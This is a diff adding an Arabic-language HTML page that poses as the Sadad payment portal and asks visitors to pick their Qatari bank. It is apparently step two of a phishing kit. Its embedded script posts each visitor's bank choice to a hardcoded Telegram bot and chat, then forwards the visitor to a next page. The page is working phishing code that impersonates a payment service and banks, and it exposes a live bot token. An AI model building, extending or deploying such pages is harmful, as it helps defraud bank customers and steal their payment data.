@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة سداد - اختر البنك</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header img { height: 60px; }
+        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
+        .bank-selection-container { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 650px; margin: auto; }
+        h2 { text-align: center; color: green; font-size: 22px; }
+        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
+        .banks-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .bank-item { display: flex; flex-direction: column; align-items: center; justify-content: center; background: #fff; border: 1px solid #e0e0e0; border-radius: 12px; padding: 15px; text-decoration: none; transition: 0.3s; height: 140px; box-sizing: border-box; }
+        .bank-item:hover { border-color: #008000; background: #f0fff0; transform: translateY(-2px); }
+        .bank-logo { max-height: 55px; max-width: 100%; margin-bottom: 12px; object-fit: contain; }
+        .bank-name { font-weight: bold; font-size: 15px; color: #333; text-align: center; }
+        @media (max-width: 480px) { .banks-grid { grid-template-columns: 1fr; } .bank-item { height: 120px; } }
+    </style>
+</head>
+<body>
+    <div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
+    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك</div>
+    <div class="bank-selection-container">
+        <h2>اختر البنك الخاص بك للدفع</h2>
+        <p>يرجى اختيار البنك لإتمام عملية الدفع:</p>
+        <div class="banks-grid" id="banksGrid">
+            <a href="#" data-bank-name="بنك قطر الوطني (QNB)" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/DteMFEGBYHAdkAAM.jpg" class="bank-logo"><span class="bank-name">بنك قطر الوطني (QNB)</span></a>
+            <a href="#" data-bank-name="مصرف قطر الإسلامي (QIB)" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/mUVEbcqCXBDFqzBu.jpeg" class="bank-logo"><span class="bank-name">مصرف قطر الإسلامي (QIB)</span></a>
+            <a href="#" data-bank-name="البنك التجاري القطري" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/BDgQzLeifzTrLZga.jpeg" class="bank-logo"><span class="bank-name">البنك التجاري القطري</span></a>
+            <a href="#" data-bank-name="مصرف الريان" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/UDUMrpnvnnvdHJXv.png" class="bank-logo"><span class="bank-name">مصرف الريان</span></a>
+            <a href="#" data-bank-name="الدولي الإسلامي (QIIB)" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/gsXDJalbnPOehsit.png" class="bank-logo"><span class="bank-name">الدولي الإسلامي (QIIB)</span></a>
+            <a href="#" data-bank-name="البنك الأهلي" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/EcPuyuCoQndHkJjN.jpg" class="bank-logo"><span class="bank-name">البنك الأهلي</span></a>
+            <a href="#" data-bank-name="بنك الدوحة" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/xktMdruMlvVGQEGl.jpeg" class="bank-logo"><span class="bank-name">بنك الدوحة</span></a>
+            <a href="#" data-bank-name="بنك دخان" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/ljEpJgFDZnvkWbRD.jpeg" class="bank-logo"><span class="bank-name">بنك دخان</span></a>
+            <a href="#" data-bank-name="HSBC قطر" class="bank-item"><img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663276831529/ZivWndBjzzTukoCc.png" class="bank-logo"><span class="bank-name">HSBC قطر</span></a>
+        </div>
+    </div>
+
+<script>
+// --- معلومات بوت التليجرام ---
+const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
+const CHAT_ID = "1537773335";
+
+document.getElementById('banksGrid').addEventListener('click', async function(e) {
+    let target = e.target.closest('.bank-item');
+    if (target) {
+        e.preventDefault();
+        
+        target.style.pointerEvents = 'none';
+        target.style.opacity = '0.5';
+
+        const bankName = target.dataset.bankName;
+
+        let message = `
+*🏦===== [ الخطوة 2: اختيار البنك ] =====🏦*
+
+*▫️ البنك المختار:* \`${bankName}\`
+--------------------------------------------------
+`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+        } catch (error) {
+            console.error("Telegram send error:", error);
+        } finally {
+            // ✅ التصحيح: تمت إعادة إضافة سطر التحويل إلى الصفحة الثالثة
+            window.location.href = 'page3.html';
+        }
+    }
+});
+</script>
+</body>
+</html>
